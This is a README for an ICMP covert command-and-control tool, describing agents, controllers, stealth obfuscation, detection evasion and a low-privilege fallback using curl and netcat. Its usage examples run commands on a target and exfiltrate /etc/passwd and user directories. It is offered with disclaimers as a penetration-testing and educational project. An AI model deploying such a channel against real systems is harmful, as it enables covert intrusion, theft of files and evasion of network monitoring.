# ICMP C2 Project

A Command & Control (C2) communication system that uses ICMP (Internet Control Message Protocol) packets to establish covert communication channels. This project demonstrates how ICMP packets can be used to send commands and receive responses, essentially creating a hidden communication channel.

## ⚠️ Security Notice

**This tool is for educational and authorized security testing purposes only.**
- Use only in controlled testing environments
- Ensure you have proper authorization before testing
- Do not use for malicious purposes
- Understand the legal implications in your jurisdiction

## Project Structure

```
icmp_tests/
├── core/                    # Core utilities and configurations
│   ├── utils.py            # Utility functions (validation, obfuscation, rate limiting)
│   └── stealth_config.py   # Stealth configuration profiles
├── agents/                  # Agent implementations
│   ├── agent.py            # Basic ICMP agent (simple implementation)
│   ├── icmp_agent.py       # Advanced stealth agent (full features)
│   └── low_privilege_agent.py  # Low-privilege agent (no root required)
├── controllers/             # Controller implementations
│   ├── icmp_c2_server.py   # Stealth C2 server (command-line)
│   ├── icmp_shell.py       # Interactive shell controller
│   └── low_privilege_controller.py  # Low-privilege controller (no root required)
├── data/                    # Data directories
│   ├── sessions/           # Session data and chunks
│   ├── outputs/            # Command outputs and files
│   └── logs/               # Log files
├── requirements.txt
└── README.md
```

## Installation

### Prerequisites
- Python 3.7+
- Network access
- **Optional**: Root/Administrator privileges (for full functionality)

### Setup
```bash
# Clone the repository
git clone <repository-url>
cd icmp_tests

# Install dependencies
pip install -r requirements.txt
```

## Quick Start

### Option 1: Full Functionality (Requires Root)
```bash
# Start the agent (target machine)
sudo python3 agents/icmp_agent.py

# Control from C2 server
python3 controllers/icmp_c2_server.py <TARGET_IP> cmd 'whoami'
```

### Option 2: Low-Privilege Mode (No Root Required)
```bash
# Start the low-privilege agent (target machine)
python3 agents/low_privilege_agent.py <CONTROLLER_IP>

# Control from low-privilege controller
python3 controllers/low_privilege_controller.py <TARGET_IP> 'whoami'
```

## Operating Modes: Full vs Low-Privilege

### Why Two Different Modes?

The ICMP C2 system provides two distinct operating modes to accommodate different environments and privilege levels:

#### **Full Mode (Root Privileges Required)**
- **Purpose**: Complete ICMP-based C2 functionality with maximum stealth
- **Requirements**: Root/Administrator privileges
- **Use Case**: Professional security testing, penetration testing, research environments

#### **Low-Privilege Mode (No Root Required)**
- **Purpose**: Educational and testing environments where elevated privileges aren't available
- **Requirements**: Standard user privileges only
- **Use Case**: Learning environments, restricted systems, educational demonstrations

### Technical Differences Explained

#### **1. Network Access Level**

**Full Mode:**
- **Raw Socket Access**: Direct access to network interfaces for packet creation and capture
- **Custom ICMP Packets**: Complete control over ICMP packet structure, headers, and payloads
- **Real-time Packet Sniffing**: Immediate capture and processing of incoming ICMP packets
- **Why Required**: Operating systems restrict raw socket access to prevent unauthorized network manipulation

**Low-Privilege Mode:**
- **Standard System Tools**: Uses existing system utilities (ping, curl, netcat)
- **Indirect Communication**: Relies on environment variables, temporary files, and standard protocols
- **Polling-based Detection**: Periodic checking for commands rather than real-time capture
- **Why Limited**: Standard user privileges cannot create custom network packets or capture raw traffic

#### **2. Payload Size and Efficiency**

**Full Mode:**
- **Maximum Payload**: Up to 1472 bytes per ICMP packet (MTU - IP/ICMP headers)
- **Direct Transmission**: Single packet can carry substantial command data
- **Efficient Chunking**: Optimized packet fragmentation for large data transfers

**Low-Privilege Mode:**
- **Limited Payload**: Maximum 56 bytes per packet (standard ping payload size)
- **Multiple Fallbacks**: Requires multiple transmission attempts with different methods
- **Inefficient Transfer**: Large data must be split into many small chunks

#### **3. Stealth and Detection Evasion**

**Full Mode:**
- **Advanced Obfuscation**: 3-level payload obfuscation with XOR encryption and steganography
- **Rate Limiting**: Sophisticated packet rate limiting to mimic normal network behavior
- **Realistic Timing**: Variable delays and jitter to avoid traffic pattern detection
- **Custom Headers**: Realistic ICMP ID and sequence numbers

**Low-Privilege Mode:**
- **Basic Encoding**: Simple Base64 encoding only
- **No Rate Limiting**: Cannot control packet timing or frequency
- **Predictable Patterns**: Standard ping behavior is easily detectable
- **Standard Headers**: Uses default ping packet headers

#### **4. Communication Reliability**

**Full Mode:**
- **Bidirectional Communication**: Real-time command and response exchange
- **Session Management**: Persistent session tracking with unique IDs
- **Automatic Retry**: Built-in retry mechanism for lost packets
- **Error Recovery**: Comprehensive error handling and recovery

**Low-Privilege Mode:**
- **Unidirectional**: Primarily one-way communication with limited feedback
- **No Session Tracking**: Basic communication without session management
- **Manual Retry**: Requires manual intervention for failed transmissions
- **Limited Error Handling**: Basic error detection without recovery mechanisms

#### **5. Detection Capabilities**

**Full Mode:**
- **Real-time Monitoring**: Immediate detection of incoming commands
- **Packet Analysis**: Deep packet inspection and payload extraction
- **Network Interface Control**: Direct access to network interface statistics
- **Advanced Filtering**: Custom packet filtering and processing

**Low-Privilege Mode:**
- **Polling-based**: Periodic checking for commands (every 5 seconds)
- **Limited Analysis**: Basic text parsing of system tool outputs
- **No Interface Access**: Cannot directly monitor network interfaces
- **Basic Filtering**: Simple text-based command detection

### Performance Comparison

| Feature | Full Mode | Low-Privilege Mode |
|---------|-----------|-------------------|
| **Privilege Level** | Root Required | Standard User |
| **Payload Size** | Up to 1472 bytes | 56 bytes max |
| **Communication Speed** | Real-time | 5-second polling |
| **Stealth Level** | High (3 levels) | Low (basic) |
| **Reliability** | High | Medium |
| **Detection Capability** | Advanced | Basic |
| **Setup Complexity** | Simple | Complex (multiple fallbacks) |
| **Network Requirements** | ICMP allowed | Multiple protocols |

## Running Without High Privileges

The system can run without root/administrator privileges using the low-privilege mode, though with some limitations:

### Low-Privilege Mode Features
- **No Root Required**: Uses standard system tools instead of raw sockets
- **Basic Functionality**: Command execution and file retrieval
- **Multiple Transport Methods**: ping, curl, netcat, environment variables
- **Local Testing**: File-based communication for testing

### Limitations
- **Reduced Stealth**: Limited obfuscation and rate limiting
- **Smaller Payloads**: Maximum 56 bytes per packet
- **Slower Communication**: Multiple fallback methods
- **Limited Detection**: Basic network monitoring only

### Usage Examples (Low-Privilege)
```bash
# Start low-privilege agent
python3 agents/low_privilege_agent.py 192.168.1.100

# Single command
python3 controllers/low_privilege_controller.py 192.168.1.100 'ls -la'

# Interactive shell
python3 controllers/low_privilege_controller.py 192.168.1.100

# File retrieval
python3 controllers/low_privilege_controller.py 192.168.1.100 'get /etc/passwd'
```

### Transport Methods Used
1. **Environment Variables**: Pass data through ping environment
2. **Ping Custom Data**: Use ping's payload option (if supported)
3. **Curl ICMP**: Use curl with ICMP protocol (if available)
4. **Netcat UDP**: Fallback to UDP communication
5. **Temporary Files**: Local file-based communication for testing

## Features

### Core Functionality
- **Command Execution**: Execute shell commands on target systems
- **File Transfer**: Retrieve files and directories from target systems
- **Interactive Shell**: Real-time command execution with persistent session
- **Session Management**: Unique session IDs with collision prevention
- **Chunking**: Large data split into manageable packets
- **Retry Logic**: Automatic resend of missing chunks

### Stealth Features (Full Mode Only)
- **Obfuscation Levels**: 3 levels of payload obfuscation
- **Rate Limiting**: Configurable packet rate limits
- **Realistic Delays**: Natural timing between packets
- **Interface Detection**: Automatic network interface detection
- **Privilege Checking**: Proper privilege validation

### Security Features
- **Command Validation**: Protection against dangerous commands
- **Path Sanitization**: Prevention of directory traversal attacks
- **Input Validation**: Comprehensive input sanitization
- **Error Handling**: Robust error handling and recovery

## Usage Examples

### Basic Command Execution
```bash
# Execute a simple command
python3 controllers/icmp_c2_server.py 192.168.1.100 cmd 'ls -la'

# Get system information
python3 controllers/icmp_c2_server.py 192.168.1.100 cmd 'uname -a'
```

### File Operations
```bash
# Retrieve a specific file
python3 controllers/icmp_c2_server.py 192.168.1.100 file /etc/passwd

# Retrieve an entire directory
python3 controllers/icmp_c2_server.py 192.168.1.100 folder /home/user/documents
```

### Interactive Mode
```bash
# Start interactive shell
sudo python3 controllers/icmp_shell.py 192.168.1.100

# Available commands in interactive mode:
# - help: Show available commands
# - clear: Clear the screen
# - status: Show connection status
# - history: Show command history
# - exit/quit: Exit the shell
```

## Configuration

### Environment Variables
- `ICMP_STEALTH_MODE`: Set stealth mode (stealth, normal, aggressive)

### Stealth Modes
- **stealth**: Maximum stealth with high obfuscation and low rate limits
- **normal**: Balanced stealth and performance (default)
- **aggressive**: Maximum performance with basic stealth

## Technical Details

### Protocol
- Uses ICMP Echo Request/Reply packets
- Payload obfuscation with multiple levels
- Session-based communication with unique IDs
- Automatic chunking for large data transfers

### Network Requirements
- ICMP packets must be allowed through firewalls
- **Full Mode**: Requires root/administrator privileges for packet sniffing
- **Low-Privilege Mode**: Uses standard system tools
- Works on most network configurations

### Data Storage
- Session data stored in `data/sessions/`
- Command outputs stored in `data/outputs/`
- Automatic cleanup of old session files

## Troubleshooting

### Common Issues
1. **Permission Denied**: 
   - Full mode: Run with sudo/administrator privileges
   - Low-privilege mode: Use low-privilege scripts
2. **No Response**: Check if agent is running and network is accessible
3. **Interface Issues**: Verify network interface detection
4. **Firewall Blocking**: Ensure ICMP packets are allowed

### Debug Mode
Enable debug output by setting environment variables or checking debug messages in the code.

## Legal and Ethical Considerations

This tool is designed for:
- Educational purposes
- Authorized security testing
- Research and development
- Penetration testing (with proper authorization)

**Do not use this tool for:**
- Unauthorized access to systems
- Malicious activities
- Any illegal purposes

Always ensure you have proper authorization before testing on any network or system.

## Contributing

This is a basic implementation demonstrating ICMP-based C2 communication. The project serves as a foundation for understanding covert communication techniques and network protocol manipulation.

## License

This project is for educational purposes only. Use responsibly and in accordance with applicable laws and regulations. 